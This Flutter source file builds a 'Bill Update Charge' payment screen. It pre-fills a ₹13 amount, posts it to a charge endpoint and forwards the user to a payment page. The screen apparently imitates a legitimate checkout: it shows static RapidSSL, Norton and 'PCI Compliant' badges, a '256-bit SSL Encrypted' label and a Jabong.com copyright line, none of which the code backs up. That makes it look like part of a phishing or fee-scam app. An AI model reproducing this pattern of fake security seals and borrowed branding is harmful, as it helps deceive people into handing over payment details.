import 'package:flutter/material.dart';
import 'package:go_router/go_router.dart';
import 'dart:convert';
import 'package:http/http.dart' as http;
import '../api_config.dart';
import '../theme.dart';

class ChargeScreen extends StatefulWidget {
  final Map data;
  const ChargeScreen({super.key, required this.data});
  @override
  State<ChargeScreen> createState() => _S();
}

class _S extends State<ChargeScreen> {
  final amount = TextEditingController(text: '13.0');

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(child: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Row(children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [AppColors.blue.withValues(alpha: .15), AppColors.navy.withValues(alpha: .08)],
                  begin: Alignment.topLeft, end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(12),
              ),
              child: const Icon(Icons.credit_card, color: AppColors.blue, size: 24),
            ),
            const SizedBox(width: 14),
            Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
              Text('Bill Update Charge', style: AppStyles.headerStyle),
              const SizedBox(height: 2),
              const Text('Complete your payment', style: AppStyles.bodySmall),
            ]),
          ]),
          const SizedBox(height: 24),
          Container(
            padding: const EdgeInsets.all(24),
            decoration: AppStyles.cardDecoration,
            child: Column(children: [
              Row(children: const [
                Icon(Icons.edit_note, size: 20, color: AppColors.blue),
                SizedBox(width: 8),
                Text('Enter Amount', style: AppStyles.subHeaderStyle),
              ]),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: [AppColors.blue.withValues(alpha: .06), AppColors.navy.withValues(alpha: .04)],
                    begin: Alignment.topLeft, end: Alignment.bottomRight,
                  ),
                  border: Border.all(color: AppColors.blue.withValues(alpha: .3), width: 2),
                  borderRadius: BorderRadius.circular(14),
                ),
                child: Row(children: [
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    decoration: BoxDecoration(
                      color: AppColors.blue.withValues(alpha: .1),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: const Text('\u{20B9}', style: TextStyle(fontSize: 22, color: AppColors.blue, fontWeight: FontWeight.w800)),
                  ),
                  const SizedBox(width: 16),
                  Expanded(child: TextField(
                    controller: amount, keyboardType: TextInputType.number, textAlign: TextAlign.center,
                    style: const TextStyle(fontSize: 32, fontWeight: FontWeight.bold, color: AppColors.textDark, letterSpacing: 1),
                    decoration: const InputDecoration(border: InputBorder.none, isDense: true),
                  )),
                ]),
              ),
            ]),
          ),
          const SizedBox(height: 20),
          Container(
            padding: const EdgeInsets.all(20),
            decoration: AppStyles.cardDecoration,
            child: Column(children: [
              Row(children: const [
                Icon(Icons.security, size: 18, color: AppColors.green),
                SizedBox(width: 8),
                Text('Secured by', style: TextStyle(fontWeight: FontWeight.w700, color: AppColors.navy, fontSize: 15)),
              ]),
              const SizedBox(height: 16),
              Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: const [
                _Badge('RapidSSL', 'Advanced Security', Color(0xFF009900)),
                _Badge('Norton', '256-bit Encryption', Color(0xFFCC0000)),
                _Badge('Panacea', 'PCI Compliant', Color(0xFF1A5276)),
              ]),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  color: AppColors.fieldBg,
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: AppColors.fieldBorder),
                ),
                child: Row(children: const [
                  Icon(Icons.business, size: 16, color: AppColors.navy),
                  SizedBox(width: 10),
                  Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                    Text('PC4 COMPANY IP', style: TextStyle(fontWeight: FontWeight.bold, color: AppColors.navy, fontSize: 13)),
                    SizedBox(height: 2),
                    Text('P000C99 | P000C99', style: TextStyle(color: AppColors.textMedium, fontSize: 12, letterSpacing: 2)),
                  ]),
                ]),
              ),
              const SizedBox(height: 16),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                decoration: BoxDecoration(
                  color: Colors.green.shade50,
                  borderRadius: BorderRadius.circular(8),
                ),
                child: Row(mainAxisAlignment: MainAxisAlignment.center, children: const [
                  Icon(Icons.lock, size: 14, color: AppColors.green),
                  SizedBox(width: 6),
                  Text('256-bit SSL Encrypted', style: TextStyle(color: AppColors.green, fontSize: 12, fontWeight: FontWeight.w600)),
                ]),
              ),
            ]),
          ),
          const SizedBox(height: 24),
          SizedBox(width: double.infinity, height: 54, child: ElevatedButton.icon(
            onPressed: () {
  final amt = double.tryParse(amount.text) ?? 0;
  http.post(Uri.parse('$apiBaseUrl/api/charge'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'amount': amt}))
    .then((_) => print('API success'))
    .catchError((e) => print('API error: $e'));
  context.push('/payment', extra: amt);
},
            icon: const Icon(Icons.lock, size: 18),
            label: const Text('Continue to Payment', style: TextStyle(fontSize: 16, fontWeight: FontWeight.w700)),
            style: AppStyles.primaryButton(double.infinity),
          )),
          const SizedBox(height: 20),
          const Center(child: Text('Copyright \u{00A9} 2017 Jabong.com. All Rights Reserved.',
              style: TextStyle(color: AppColors.textLight, fontSize: 12))),
          const SizedBox(height: 8),
        ]),
      )),
    );
  }
}

class _Badge extends StatelessWidget {
  final String tag, label;
  final Color color;
  const _Badge(this.tag, this.label, this.color);
  @override
  Widget build(BuildContext context) => Column(children: [
    Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [color.withValues(alpha: .08), color.withValues(alpha: .03)],
          begin: Alignment.topLeft, end: Alignment.bottomRight,
        ),
        border: Border.all(color: color.withValues(alpha: .2)),
        borderRadius: BorderRadius.circular(8),
      ),
      child: Text(tag, style: TextStyle(fontWeight: FontWeight.bold, fontSize: 11, color: color)),
    ),
    const SizedBox(height: 6),
    Text(label, style: const TextStyle(fontSize: 10, fontWeight: FontWeight.w600, color: AppColors.textMedium)),
  ]);
}
